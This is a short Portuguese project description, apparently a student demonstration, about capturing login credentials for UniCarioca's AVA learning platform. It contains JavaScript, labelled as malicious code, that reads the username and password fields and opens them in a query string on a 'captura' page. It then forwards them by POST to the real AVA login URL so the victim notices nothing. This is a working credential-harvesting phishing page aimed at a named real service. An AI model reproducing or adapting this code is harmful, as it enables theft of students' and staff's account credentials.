Hackeando o AVA da UniCarioca


Este projeto tem como foco realizar a tentativa de capturar o login e senha de acesso ao AVA da UniCarioca, para isso utilizará o FORM com método POST. O acesso ao AVA será realizado normalmente, porém o login e senha serão capturados e exibidos em uma nova janela de demonstração usando o método get.

Código Malicioso

function capturar(){
var user = document.getElementById("user").value;
var pass = document.getElementById("pass").value;

window.open('captura/index.html?user='+user+'&pass='+pass);

document.body.innerHTML += '<form id="ava" action="http://ava.unicarioca.edu.br/login" method="post"><input type="hidden" name="username" value="'+user+'"><input type="hidden" name="password" value="'+pass+'"></form>';
document.getElementById("ava").submit();
}
